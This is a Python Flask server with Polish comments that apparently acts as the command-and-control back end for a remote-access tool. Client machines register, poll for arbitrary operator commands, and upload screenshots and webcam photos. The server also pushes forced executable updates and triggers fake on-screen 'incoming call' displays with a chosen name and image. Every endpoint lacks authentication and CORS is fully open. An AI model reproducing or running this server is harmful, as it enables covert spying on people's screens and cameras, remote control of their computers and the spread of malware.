from flask import Flask, render_template, jsonify, request, send_from_directory
from flask_cors import CORS
import time
import threading
import base64
from datetime import datetime
import os
import json

app = Flask(__name__)
CORS(app)

CAMERA_DIR = "camera_shots"
os.makedirs(CAMERA_DIR, exist_ok=True)

SCREENSHOTS_DIR = "screenshots"
os.makedirs(SCREENSHOTS_DIR, exist_ok=True)

UPDATES_DIR = "updates"
os.makedirs(UPDATES_DIR, exist_ok=True)

VERSIONS_FILE = os.path.join(UPDATES_DIR, "versions.json")

NAMES_FILE = "name.txt"
clients = {}
client_lock = threading.Lock()

custom_names = {}

def init_versions_file():
    if not os.path.exists(VERSIONS_FILE):
        default_versions = {
            "program.exe": {
                "version": "1.0.0",
                "filename": "program1.exe",
                "description": "Główny program",
                "release_date": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "min_version": "1.0.0",
                "force_update": False
            }
        }
        with open(VERSIONS_FILE, 'w', encoding='utf-8') as f:
            json.dump(default_versions, f, indent=4, ensure_ascii=False)
        print("📝 Utworzono domyślny plik versions.json")

init_versions_file()

def load_custom_names():
    global custom_names
    try:
        if os.path.exists(NAMES_FILE):
            with open(NAMES_FILE, 'r', encoding='utf-8') as f:
                content = f.read()
                # Czyść stary słownik
                custom_names = {}
                
                # Parsuj linie pliku
                lines = content.strip().split('\n')
                for line in lines:
                    line = line.strip()
                    if line and not line.startswith('#') and '=' in line:
                        # Podziel na ID i nazwę
                        parts = line.split('=', 1)
                        if len(parts) == 2:
                            client_id = parts[0].strip()
                            custom_name = parts[1].strip()
                            if client_id and custom_name:
                                custom_names[client_id] = custom_name
                                
            print(f"📝 Załadowano {len(custom_names)} niestandardowych nazw z {NAMES_FILE}")
        else:
            print("📝 Plik name.txt nie istnieje, zostanie utworzony przy pierwszym zapisie")
            custom_names = {}
    except Exception as e:
        print(f"❌ Błąd ładowania pliku name.txt: {e}")
        custom_names = {}

# Zapisz nazwy do pliku
def save_custom_names():
    try:
        lines = []
        for client_id, name in custom_names.items():
            if client_id and name:
                lines.append(f"{client_id}={name}")
        
        # Dodaj komentarz na początku pliku
        content = "# Plik z niestandardowymi nazwami klientów\n"
        content += "# Format: ID_KLIENTA=Nazwa\n"
        content += "# Przykład: abc123=Kamil Komputer\n"
        content += "\n" + "\n".join(lines)
        
        with open(NAMES_FILE, 'w', encoding='utf-8') as f:
            f.write(content)
            
        print(f"💾 Zapisano {len(custom_names)} nazw do {NAMES_FILE}")
        return True
    except Exception as e:
        print(f"❌ Błąd zapisywania do name.txt: {e}")
        return False

# Załaduj nazwy przy starcie serwera
load_custom_names()

@app.route('/')
def index():
    return render_template('index.html')

# Dodaj te nowe endpointy:

@app.route('/api/updates/check/<client_version>')
def check_updates(client_version):
    """Sprawdź czy jest nowsza wersja dla klienta"""
    try:
        with open(VERSIONS_FILE, 'r', encoding='utf-8') as f:
            versions = json.load(f)
        
        latest = versions.get("program.exe", {})
        latest_version = latest.get("version", "1.0.0")
        
        # Porównaj wersje (proste porównanie string, możesz użyć packaging.version dla lepszego porównania)
        needs_update = client_version != latest_version
        
        return jsonify({
            'success': True,
            'needs_update': needs_update,
            'latest_version': latest_version,
            'filename': latest.get('filename'),
            'force_update': latest.get('force_update', False),
            'description': latest.get('description', '')
        })
        
    except Exception as e:
        print(f"❌ Błąd sprawdzania aktualizacji: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/debug/updates')
def debug_updates():
    """Endpoint diagnostyczny do sprawdzenia konfiguracji"""
    try:
        # Sprawdź czy folder istnieje
        folder_exists = os.path.exists(UPDATES_DIR)
        
        # Lista plików w folderze
        files = []
        if folder_exists:
            files = os.listdir(UPDATES_DIR)
        
        # Sprawdź plik versions.json
        versions = {}
        versions_exists = os.path.exists(VERSIONS_FILE)
        if versions_exists:
            with open(VERSIONS_FILE, 'r', encoding='utf-8') as f:
                versions = json.load(f)
        
        # Ścieżki
        current_dir = os.getcwd()
        
        return jsonify({
            'success': True,
            'server_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'current_directory': current_dir,
            'updates_folder': {
                'exists': folder_exists,
                'path': os.path.join(current_dir, UPDATES_DIR),
                'files': files
            },
            'versions_file': {
                'exists': versions_exists,
                'path': os.path.join(current_dir, VERSIONS_FILE),
                'content': versions
            },
            'endpoints': {
                'check': '/api/updates/check/<version>',
                'download': '/api/updates/download/<filename>',
                'list': '/api/updates/list'
            }
        })
    except Exception as e:
        return jsonify({
            'success': False,
            'error': str(e)
        }), 500

@app.route('/api/updates/download/<filename>')
def download_update(filename):
    """Pobierz plik aktualizacji"""
    try:
        # Zabezpieczenie przed path traversal
        if '..' in filename or filename.startswith('/'):
            return jsonify({'error': 'Invalid filename'}), 400
            
        filepath = os.path.join(UPDATES_DIR, filename)
        if os.path.exists(filepath):
            return send_from_directory(UPDATES_DIR, filename, as_attachment=True)
        else:
            return jsonify({'error': 'File not found'}), 404
            
    except Exception as e:
        print(f"❌ Błąd pobierania pliku: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/updates/list')
def list_updates():
    """Lista dostępnych aktualizacji (dla panelu admina)"""
    try:
        files = []
        for filename in os.listdir(UPDATES_DIR):
            if filename.endswith('.exe') and filename != 'versions.json':
                filepath = os.path.join(UPDATES_DIR, filename)
                stat = os.stat(filepath)
                files.append({
                    'filename': filename,
                    'size': stat.st_size,
                    'modified': datetime.fromtimestamp(stat.st_mtime).strftime('%Y-%m-%d %H:%M:%S')
                })
        
        # Sortuj od najnowszych
        files.sort(key=lambda x: x['modified'], reverse=True)
        
        return jsonify({
            'success': True,
            'files': files,
            'versions': json.load(open(VERSIONS_FILE, 'r', encoding='utf-8'))
        })
        
    except Exception as e:
        print(f"❌ Błąd listowania aktualizacji: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/updates/upload', methods=['POST'])
def upload_update():
    """Wgraj nową wersję pliku (dla panelu admina)"""
    try:
        if 'file' not in request.files:
            return jsonify({'success': False, 'error': 'No file'})
        
        file = request.files['file']
        version = request.form.get('version', '1.0.0')
        description = request.form.get('description', '')
        force = request.form.get('force', 'false').lower() == 'true'
        
        if file.filename == '':
            return jsonify({'success': False, 'error': 'Empty filename'})
        
        # Generuj nazwę pliku z wersją
        base_name = os.path.splitext(file.filename)[0]
        ext = os.path.splitext(file.filename)[1]
        new_filename = f"{base_name}{version.replace('.', '_')}{ext}"
        
        # Zapisz plik
        filepath = os.path.join(UPDATES_DIR, new_filename)
        file.save(filepath)
        
        # Aktualizuj versions.json
        with open(VERSIONS_FILE, 'r', encoding='utf-8') as f:
            versions = json.load(f)
        
        versions["program.exe"] = {
            "version": version,
            "filename": new_filename,
            "description": description,
            "release_date": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "force_update": force
        }
        
        with open(VERSIONS_FILE, 'w', encoding='utf-8') as f:
            json.dump(versions, f, indent=4, ensure_ascii=False)
        
        print(f"📦 Wgrano nową wersję {version}: {new_filename}")
        return jsonify({'success': True, 'filename': new_filename})
        
    except Exception as e:
        print(f"❌ Błąd wgrywania aktualizacji: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/get_names_file')
def get_names_file():
    """Pobierz zawartość pliku name.txt"""
    try:
        if os.path.exists(NAMES_FILE):
            with open(NAMES_FILE, 'r', encoding='utf-8') as f:
                content = f.read()
            return content, 200, {'Content-Type': 'text/plain; charset=utf-8'}
        else:
            return "# Plik z niestandardowymi nazwami klientów\n# Format: ID_KLIENTA=Nazwa\n", 200, {'Content-Type': 'text/plain; charset=utf-8'}
    except Exception as e:
        print(f"❌ Błąd odczytu pliku name.txt: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/save_names_file', methods=['POST'])
def save_names_file():
    """Zapisz zawartość pliku name.txt"""
    try:
        content = request.json.get('content', '')
        
        # Walidacja podstawowa
        if not isinstance(content, str):
            return jsonify({'success': False, 'error': 'Nieprawidłowy format danych'})
        
        # Sprawdź czy zawartość nie jest zbyt długa
        if len(content) > 100000:  # 100KB maksymalnie
            return jsonify({'success': False, 'error': 'Plik jest zbyt duży (max 100KB)'})
        
        # Zapis do pliku
        try:
            with open(NAMES_FILE, 'w', encoding='utf-8') as f:
                f.write(content)
            
            # Ponownie załaduj nazwy do pamięci
            load_custom_names()
            
            return jsonify({'success': True})
        except Exception as e:
            print(f"❌ Błąd zapisu do pliku: {e}")
            return jsonify({'success': False, 'error': f'Błąd zapisu: {str(e)}'})
            
    except Exception as e:
        print(f"❌ Błąd zapisywania pliku name.txt: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/get_client_names')
def get_client_names():
    """Pobierz wszystkie niestandardowe nazwy klientów"""
    try:
        return jsonify(custom_names)
    except Exception as e:
        print(f"❌ Błąd pobierania nazw klientów: {e}")
        return jsonify({}), 500

@app.route('/api/get_clients_with_names')
def get_clients_with_names():
    """Zwraca listę klientów z niestandardowymi nazwami"""
    with client_lock:
        current_time = time.time()
        client_list = []
        
        for client_id, client_data in clients.items():
            # Czyszczenie nieaktywnych klientów
            if current_time - client_data['last_seen'] > 30:
                continue
            
            # Sprawdź dostępność screenshotów i kamery
            has_camera = (
                'last_camera' in client_data and 
                'last_camera_time' in client_data and
                current_time - client_data['last_camera_time'] < 300
            )
            
            has_screenshot = (
                'last_screenshot' in client_data and 
                'last_screenshot_time' in client_data and
                current_time - client_data['last_screenshot_time'] < 300
            )
            
            # Określ wyświetlaną nazwę
            display_name = custom_names.get(client_id) or client_data.get('name', 'Klient')
            has_custom_name = client_id in custom_names
            
            client_list.append({
                'id': client_id,
                'name': client_data.get('name', 'Klient'),
                'displayName': display_name,
                'hasCustomName': has_custom_name,
                'status': 'active' if current_time - client_data['last_seen'] < 10 else 'inactive',
                'ip': client_data.get('ip', '0.0.0.0'),
                'has_screenshot': has_screenshot,
                'has_camera': has_camera,
                'last_screenshot_time': client_data.get('last_screenshot_time'),
                'last_camera_time': client_data.get('last_camera_time')
            })
        
        return jsonify(client_list)

@app.route('/api/rename_client', methods=['POST'])
def rename_client():
    """Zmień nazwę klienta (dla kompatybilności z GUI)"""
    try:
        data = request.json
        client_id = data.get('clientId')
        new_name = data.get('newName')
        
        if not client_id or not new_name:
            return jsonify({'success': False, 'error': 'Brakujące dane'})
        
        # Przytnij nazwę do rozsądnej długości
        new_name = new_name.strip()[:50]
        
        if not new_name:
            return jsonify({'success': False, 'error': 'Nazwa nie może być pusta'})
        
        # Dodaj/zmień nazwę w słowniku
        custom_names[client_id] = new_name
        
        # Zapisz do pliku
        if save_custom_names():
            return jsonify({'success': True})
        else:
            return jsonify({'success': False, 'error': 'Błąd zapisu do pliku'})
            
    except Exception as e:
        print(f"❌ Błąd zmiany nazwy klienta: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/get_client_name/<client_id>')
def get_client_name(client_id):
    """Pobierz nazwę konkretnego klienta"""
    try:
        # Pobierz nazwę niestandardową jeśli istnieje
        custom_name = custom_names.get(client_id)
        
        # Pobierz domyślną nazwę z danych klienta
        default_name = None
        with client_lock:
            if client_id in clients:
                default_name = clients[client_id].get('name', f'Klient {client_id[:6]}')
        
        return jsonify({
            'customName': custom_name,
            'displayName': custom_name or default_name or f'Klient {client_id[:6]}'
        })
    except Exception as e:
        print(f"❌ Błąd pobierania nazwy klienta: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/get_all_clients')
def get_all_clients():
    """Pobierz wszystkich klientów (także nieaktywnych)"""
    with client_lock:
        # Tworzymy listę wszystkich zarejestrowanych klientów
        client_list = []
        for client_id, client_data in clients.items():
            # Określ status na podstawie czasu ostatniej aktywności
            is_active = time.time() - client_data['last_seen'] < 30
            
            client_list.append({
                'id': client_id,
                'name': client_data.get('name', 'Klient'),
                'displayName': custom_names.get(client_id) or client_data.get('name', 'Klient'),
                'status': 'active' if is_active else 'inactive',
                'last_seen': client_data.get('last_seen'),
                'ip': client_data.get('ip', '0.0.0.0')
            })
        
        return jsonify(client_list)

# Modyfikuj endpoint /api/register, aby używał niestandardowych nazw:
@app.route('/api/register', methods=['POST'])
def register_client():
    try:
        data = request.json or {}
        client_id = data.get('id')
        client_name = data.get('name', 'Klient')

        if not client_id:
            return jsonify({'success': False, 'error': 'missing_id'})

        with client_lock:
            # Użyj niestandardowej nazwy jeśli istnieje, w przeciwnym razie użyj dostarczonej
            display_name = custom_names.get(client_id, client_name)
            
            clients[client_id] = {
                'name': display_name,  # Używamy niestandardowej nazwy
                'original_name': client_name,  # Zachowaj oryginalną nazwę
                'last_seen': time.time(),
                'command': None,
                'command_time': None,
                'ip': request.remote_addr
            }

        print(f"✅ Rejestracja klienta: {client_id} ({display_name})")
        return jsonify({'success': True})

    except Exception as e:
        print(f"❌ Błąd rejestracji: {e}")
        return jsonify({'success': False})

# Modyfikuj endpoint /api/clients, aby uwzględniał niestandardowe nazwy:
@app.route('/api/clients')
def get_clients():
    """Zwraca listę aktywnych klientów z niestandardowymi nazwami"""
    with client_lock:
        # Czyszczenie nieaktywnych klientów (> 30 sekund)
        current_time = time.time()
        inactive_clients = []
        
        for client_id, client_data in clients.items():
            if current_time - client_data['last_seen'] > 30:
                inactive_clients.append(client_id)
        
        for client_id in inactive_clients:
            del clients[client_id]
        
        # Przygotowanie listy klientów
        client_list = []
        for client_id, client_data in clients.items():
            is_active = current_time - client_data['last_seen'] < 10
            
            # Użyj niestandardowej nazwy jeśli istnieje
            display_name = custom_names.get(client_id) or client_data.get('name', 'Klient')
            
            # Sprawdź dostępność screenshotów i kamery
            has_camera = (
                'last_camera' in client_data and 
                'last_camera_time' in client_data and
                current_time - client_data['last_camera_time'] < 300
            )
            
            has_screenshot = (
                'last_screenshot' in client_data and 
                'last_screenshot_time' in client_data and
                current_time - client_data['last_screenshot_time'] < 300
            )
            
            client_list.append({
                'id': client_id,
                'name': display_name,
                'hasCustomName': client_id in custom_names,
                'status': 'active' if is_active else 'inactive',
                'ip': client_data.get('ip', '0.0.0.0'),
                'has_screenshot': has_screenshot,
                'has_camera': has_camera
            })
        
        return jsonify(client_list)

# Pozostałe endpointy pozostają bez zmian:
@app.route('/api/upload_camera', methods=['POST'])
def upload_camera():
    """Endpoint do uploadu zdjęć z kamery"""
    try:
        client_id = request.form.get('id')
        if not client_id:
            return jsonify({'success': False, 'error': 'missing_id'})
        
        if 'camera' not in request.files:
            return jsonify({'success': False, 'error': 'no_file'})
        
        file = request.files['camera']
        
        if file.filename == '':
            return jsonify({'success': False, 'error': 'empty_file'})
        
        # Zapisz zdjęcie z kamery
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"camera_{client_id}_{timestamp}.jpg"
        filepath = os.path.join(CAMERA_DIR, filename)
        
        # Zapisz plik
        file.save(filepath)
        
        # Zaktualizuj dane klienta
        with client_lock:
            if client_id in clients:
                clients[client_id]['last_camera'] = filename
                clients[client_id]['last_camera_time'] = time.time()
        
        print(f"📷 Zdjęcie z kamery otrzymane od klienta {client_id}")
        return jsonify({'success': True, 'filename': filename})
        
    except Exception as e:
        print(f"❌ Błąd uploadu zdjęcia z kamery: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/get_camera/<client_id>')
def get_camera(client_id):
    """Pobierz najnowsze zdjęcie z kamery klienta"""
    try:
        with client_lock:
            if client_id in clients:
                filename = clients[client_id].get('last_camera')
                if filename:
                    filepath = os.path.join(CAMERA_DIR, filename)
                    if os.path.exists(filepath):
                        # Sprawdź czy zdjęcie nie jest starsze niż 5 minut
                        camera_time = clients[client_id].get('last_camera_time', 0)
                        if time.time() - camera_time < 300:  # 5 minut
                            return send_from_directory(CAMERA_DIR, filename)
        
        # Zwróć domyślny obrazek jeśli nie ma zdjęcia z kamery
        return send_from_directory('.', 'no_camera.png', mimetype='image/png')
        
    except Exception as e:
        print(f"❌ Błąd pobierania zdjęcia z kamery: {e}")
        return jsonify({'error': str(e)})

@app.route('/api/get_clients_with_camera')
def get_clients_with_camera():
    """Zwraca listę klientów z informacją o zdjęciach z kamery"""
    with client_lock:
        current_time = time.time()
        client_list = []
        
        for client_id, client_data in clients.items():
            # Czyszczenie nieaktywnych klientów
            if current_time - client_data['last_seen'] > 30:
                continue
            
            has_camera = (
                'last_camera' in client_data and 
                'last_camera_time' in client_data and
                current_time - client_data['last_camera_time'] < 300
            )
            
            has_screenshot = (
                'last_screenshot' in client_data and 
                'last_screenshot_time' in client_data and
                current_time - client_data['last_screenshot_time'] < 300
            )
            
            # Użyj niestandardowej nazwy jeśli istnieje
            display_name = custom_names.get(client_id) or client_data.get('name', 'Klient')
            
            client_list.append({
                'id': client_id,
                'name': display_name,
                'hasCustomName': client_id in custom_names,
                'status': 'active' if current_time - client_data['last_seen'] < 10 else 'inactive',
                'ip': client_data.get('ip', '0.0.0.0'),
                'has_screenshot': has_screenshot,
                'has_camera': has_camera,
                'last_screenshot_time': client_data.get('last_screenshot_time'),
                'last_camera_time': client_data.get('last_camera_time')
            })
        
        return jsonify(client_list)

@app.route('/api/upload_screenshot', methods=['POST'])
def upload_screenshot():
    """Endpoint do uploadu screenshotów"""
    try:
        client_id = request.form.get('id')
        if not client_id:
            return jsonify({'success': False, 'error': 'missing_id'})
        
        if 'screenshot' not in request.files:
            return jsonify({'success': False, 'error': 'no_file'})
        
        file = request.files['screenshot']
        
        if file.filename == '':
            return jsonify({'success': False, 'error': 'empty_file'})
        
        # Zapisz screenshot z nazwą zawierającą ID klienta i timestamp
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"{client_id}_{timestamp}.png"
        filepath = os.path.join(SCREENSHOTS_DIR, filename)
        
        # Zapisz plik
        file.save(filepath)
        
        # Zaktualizuj dane klienta
        with client_lock:
            if client_id in clients:
                clients[client_id]['last_screenshot'] = filename
                clients[client_id]['last_screenshot_time'] = time.time()
        
        print(f"📸 Screenshot otrzymany od klienta {client_id}")
        return jsonify({'success': True, 'filename': filename})
        
    except Exception as e:
        print(f"❌ Błąd uploadu screenshotu: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/get_screenshot/<client_id>')
def get_screenshot(client_id):
    """Pobierz najnowszy screenshot klienta"""
    try:
        with client_lock:
            if client_id in clients:
                filename = clients[client_id].get('last_screenshot')
                if filename:
                    filepath = os.path.join(SCREENSHOTS_DIR, filename)
                    if os.path.exists(filepath):
                        # Sprawdź czy screenshot nie jest starszy niż 5 minut
                        screenshot_time = clients[client_id].get('last_screenshot_time', 0)
                        if time.time() - screenshot_time < 300:  # 5 minut
                            return send_from_directory(SCREENSHOTS_DIR, filename)
        
        # Zwróć domyślny obrazek jeśli nie ma screenshotu
        return send_from_directory('.', 'no_screenshot.png', mimetype='image/png')
        
    except Exception as e:
        print(f"❌ Błąd pobierania screenshotu: {e}")
        return jsonify({'error': str(e)})

@app.route('/api/get_command', methods=['POST'])
def get_command():
    try:
        data = request.json or {}
        client_id = data.get('id')

        with client_lock:
            if client_id not in clients:
                return jsonify({
                    'registered': False,
                    'error': 'not_registered'
                })

            clients[client_id]['last_seen'] = time.time()

            command = clients[client_id].get('command')
            if command:
                clients[client_id]['command'] = None
                
                # Sprawdź czy komenda to JSON (dynamiczne połączenie)
                try:
                    # Próba sparsowania jako JSON
                    cmd_data = json.loads(command)
                    if isinstance(cmd_data, dict) and cmd_data.get('command') == 'call':
                        return jsonify(cmd_data)
                except:
                    pass
                
                # Zwykła komenda tekstowa
                return jsonify({
                    'registered': True,
                    'command': command
                })

        return jsonify({
            'registered': True,
            'command': None
        })

    except Exception as e:
        print(f"❌ Błąd get_command: {e}")
        return jsonify({
            'registered': False,
            'error': 'server_error'
        })

@app.route('/api/send_dynamic_call', methods=['POST'])
def send_dynamic_call():
    """
    Wysyła dynamiczną komendę połączenia do klienta
    Oczekiwane dane:
    {
        "client_id": "id_klienta",
        "name": "Imię Nazwisko",
        "image_url": "https://example.com/image.jpg",  # opcjonalnie
        "image_base64": "base64...",  # opcjonalnie
        "bg_color": "black"  # opcjonalnie
    }
    """
    try:
        data = request.json
        client_id = data.get('client_id')
        
        if not client_id:
            return jsonify({'success': False, 'error': 'Brak client_id'})
        
        # Przygotuj komendę
        command_data = {
            'command': 'call',
            'name': data.get('name', 'Nieznany'),
            'bg_color': data.get('bg_color', 'black')
        }
        
        # Dodaj obraz jeśli jest
        if data.get('image_url'):
            command_data['image_url'] = data['image_url']
        
        if data.get('image_base64'):
            command_data['image_base64'] = data['image_base64']
        
        # Wyślij do klienta
        with client_lock:
            if client_id in clients:
                clients[client_id]['command'] = json.dumps(command_data)  # Zapisz jako JSON string
                clients[client_id]['command_time'] = time.time()
                
                client_name = custom_names.get(client_id) or clients[client_id].get('name', client_id[:8])
                print(f"📞 Wysłano dynamiczne połączenie do {client_name}: {command_data['name']}")
                return jsonify({'success': True})
            else:
                return jsonify({'success': False, 'error': 'Client not found'})
                
    except Exception as e:
        print(f"❌ Błąd wysyłania dynamicznego połączenia: {e}")
        return jsonify({'success': False, 'error': str(e)})

# Dodaj też endpoint do testowania
@app.route('/api/test_dynamic_call/<client_id>')
def test_dynamic_call(client_id):
    """Testowy endpoint do szybkiego testowania"""
    return render_template('test_call.html', client_id=client_id)

@app.route('/api/send_command', methods=['POST'])
def send_command():
    """Wysłanie komendy do klienta"""
    try:
        data = request.json
        client_id = data.get('client_id')
        command = data.get('command')
        
        with client_lock:
            if client_id in clients:
                clients[client_id]['command'] = command
                clients[client_id]['command_time'] = time.time()
                
                # Pobierz nazwę klienta do logów
                client_name = custom_names.get(client_id) or clients[client_id].get('name', client_id[:8])
                print(f"📤 Wysłano komendę '{command}' do klienta {client_name}")
                return jsonify({'success': True})
            else:
                return jsonify({'success': False, 'error': 'Client not found'})
    except Exception as e:
        print(f"❌ Błąd wysyłania komendy: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/ping')
def ping():
    return jsonify({
        'status': 'online',
        'clients_count': len(clients),
        'custom_names_count': len(custom_names),
        'time': time.time()
    })

if __name__ == '__main__':
    # Utwórz plik name.txt jeśli nie istnieje
    if not os.path.exists(NAMES_FILE):
        with open(NAMES_FILE, 'w', encoding='utf-8') as f:
            f.write("# Plik z niestandardowymi nazwami klientów\n")
            f.write("# Format: ID_KLIENTA=Nazwa\n")
            f.write("# Przykład: abc123=Kamil Komputer\n")
        print("📝 Utworzono nowy plik name.txt")
    
    app.run(host='0.0.0.0', port=5000, debug=False)